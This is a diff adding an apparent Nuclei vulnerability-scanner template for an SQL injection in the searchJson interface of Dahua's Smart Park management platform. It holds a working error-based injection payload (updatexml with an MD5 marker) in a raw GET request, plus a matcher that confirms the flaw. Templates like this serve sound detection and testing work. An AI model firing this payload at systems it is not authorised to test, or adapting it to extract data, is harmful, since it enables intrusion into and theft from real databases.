@@ -1,0 +1,25 @@
+id: dahua-smart-park-sql-injection
+
+info:
+  name: "大华智慧园区综合管理平台 searchJson 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该漏洞存在于大华智慧园区综合管理平台的 searchJson 接口中，攻击者可通过构造恶意SQL语句利用此接口实现非授权数据库操作，可能导致敏感数据泄露或数据完整性受损。
+      
+  tags: 大华智慧园区综合管理平台
+
+http:
+- raw:
+  - |
+    GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '9211897'
